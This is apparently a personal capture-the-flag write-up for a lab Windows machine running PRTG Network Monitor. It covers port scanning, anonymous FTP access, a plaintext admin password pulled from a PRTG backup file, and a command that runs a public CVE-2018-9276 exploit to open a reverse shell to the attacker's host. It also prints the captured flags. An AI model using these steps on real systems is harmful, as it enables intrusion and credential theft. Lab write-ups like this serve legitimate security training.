
Target : 10.129.230.176

Started off with the port scan : 21,80,135,139,445,5985,47001

```
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 or 2012 R2 (96%), Microsoft Windows Server 2016 or Server 2019 (95%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (94%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2016 (92%), Microsoft Windows 10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-07-21T10:11:47
|_  start_date: 2026-07-21T10:06:29

```

**Enumerating Port : 21 (FTP)**

`ftp $ip`  (anonymous:anonymous)

Used anonymous login to connect ftp and retrieved the user flag from the `ftp` in the **Users/public/Desktop** folder, but couldn't retrieve admin flag.

```
cat user.txt 
e3a14cff878d23aa802dd8262b77df05
```

![](../Pasted%20image%2020260721171107.png)

In the ProgramData folder, i found the configuration and its backup file for PRTG Netmon service, if we have the credential, we can perform attacks.

cd "C:\ProgramData\Paessler\PRTG Network Monitor\"

```
ftp> get "PRTG Configuration.dat"

ftp> get "PRTG Configuration.old.bak"
```

```PRTG Configuration.dat
<login>
                  prtgadmin
                </login>
                <name>
                  PRTG System Administrator
                </name>
                <ownerid>
                  100
                </ownerid>
                <password>
                  <flags>
                    <encrypted/>
                  </flags>
                  <cell col="0" crypt="PRTG">
                    JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA======
                  </cell>
                  <cell col="1" crypt="PRTG">
                    OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW
                  </cell>
                </password>
```

```PRTG Configuration.old.bak
<dbcredentials>
              0
            </dbcredentials>
            <dbpassword>
	      <!-- User: prtgadmin -->
	      PrTg@dmin2018
            </dbpassword>
            <dbtimeout>
              60
            </dbtimeout>
            <depdelay>
```

Got the password `PrTg@dmin2018`, but its not working, then i changed into `PrTg@dmin2019` and its successful

Enumerating Port : 139,445

`crackmapexec smb $ip -u Guest -p ""`

guest account is disabled, need to find credential pair to access smb.

Enumerating Port : 135 (MSRPC)

`impacket-rpcdump $ip`

![](../Pasted%20image%2020260721162038.png)

**Enumerating Port : 80**

It is running `Indy httpd 18.1.37.13946` (CVE-2018-9276) which is vulnerable to authenticated command injection vulnerability 

```CVE-2018-9276
An issue was discovered in PRTG Network Monitor before 18.2.39. An attacker who has access to the PRTG System Administrator web console with administrative privileges can exploit an OS command injection vulnerability (both on the server and on devices) by sending malformed parameters in sensor or notification management scenarios.
```

Tried crackmapexec to connect the found credential as Administrator user, and its failed. 

![](../Pasted%20image%2020260721172643.png)

Exploit : (https://github.com/A1vinSmith/CVE-2018-9276/blob/main/exploit.py)

`python3 exploit.py -i 10.129.230.176 -p 80 --lhost 10.10.16.241 --lport 1234 --user prtgadmin --password PrTg@dmin2019`

![](../Pasted%20image%2020260721173933.png)

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
31b7d2439c64648cee85c1a5b5d4186e
```

To be noted:

1. Solved the machine without reading any walkthroughs or hints.